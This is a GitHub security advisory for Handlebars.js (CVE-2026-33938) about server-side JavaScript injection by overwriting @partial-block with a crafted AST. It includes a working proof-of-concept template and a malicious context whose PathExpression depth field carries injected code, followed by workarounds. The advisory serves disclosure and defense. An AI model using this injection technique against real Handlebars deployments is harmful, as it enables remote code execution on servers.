# [H] Handlebars.js has JavaScript Injection via AST Type Confusion by tampering @partial-block

## Summary
Severity: High
Advisory: GHSA-3mfm-83xf-c92r
CVE: CVE-2026-33938
CWE: CWE-843, CWE-94
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-03-27
Source: https://github.com/advisories/GHSA-3mfm-83xf-c92r
Type: github-advisory

## Affected
- npm: `handlebars` — affected >=4.0.0 <4.7.9

## Details
## Summary

The `@partial-block` special variable is stored in the template data context and is reachable and mutable from within a template via helpers that accept arbitrary objects. When a helper overwrites `@partial-block` with a crafted Handlebars AST, a subsequent invocation of `{{> @partial-block}}` compiles and executes that AST, enabling arbitrary JavaScript execution on the server.

## Description

Handlebars stores `@partial-block` in the `data` frame that is accessible to templates. In nested contexts, a parent frame's `@partial-block` is reachable as `@_parent.partial-block`. Because the data frame is a mutable object, any registered helper that accepts an object reference and assigns properties to it can overwrite `@partial-block` with an attacker-controlled value.

When `{{> @partial-block}}` is subsequently evaluated, `invokePartial` receives the crafted object. The runtime, finding an object that is not a compiled function, falls back to **dynamically compiling** the value via `env.compile()`. If that value is a well-formed Handlebars AST containing injected code, the injected JavaScript runs in the server process.

The `handlebars-helpers` npm package (commonly used with Handlebars) includes several helpers such as `merge` that can be used as the mutation primitive.

## Proof of Concept

Tested with Handlebars 4.7.8 and `handlebars-helpers`:

```javascript
const Handlebars = require('handlebars');
const merge = require('handlebars-helpers').object().merge;
Handlebars.registerHelper('merge', merge);

const vulnerableTemplate = `
{{#*inline "myPartial"}}
    {{>@partial-block}}
    {{>@partial-block}}
{{/inline}}
{{#>myPartial}}
    {{merge @_parent partial-block=1}}
    {{merge @_parent partial-block=payload}}
{{/myPartial}}
`;

const maliciousContext = {
  payload: {
    type: "Program",
    body: [
      {
        type: "MustacheStatement",
        depth: 0,
        path: {
          type: "PathExpression",
          parts: ["pop"],
          original: "this.pop",
          // Code injected via depth field — breaks out of generated function call
          depth: "0])),function () {console.error('VULNERABLE: RCE via @partial-block');}()));//",
        },
      },
    ],
  },
};

Handlebars.compile(vulnerableTemplate)(maliciousContext);
// Prints: VULNERABLE: RCE via @partial-block
```

## Workarounds

- **Use the runtime-only build** (`require('handlebars/runtime')`). The `compile()` method is  absent, eliminating the vulnerable fallback path.
- **Audit registered helpers** for any that write arbitrary values to context objects. Helpers  should treat context data as read-only.
- **Avoid registering helpers** from third-party packages (such as `handlebars-helpers`) in  contexts where templates or context data can be influenced by untrusted input.

## References
- https://github.com/handlebars-lang/handlebars.js/security/advisories/GHSA-3mfm-83xf-c92r
- https://nvd.nist.gov/vuln/detail/CVE-2026-33938
- https://github.com/handlebars-lang/handlebars.js/commit/68d8df5a88e0a26fe9e6084c5c6aaebe67b07da2
- https://github.com/handlebars-lang/handlebars.js
- https://github.com/handlebars-lang/handlebars.js/releases/tag/v4.7.9
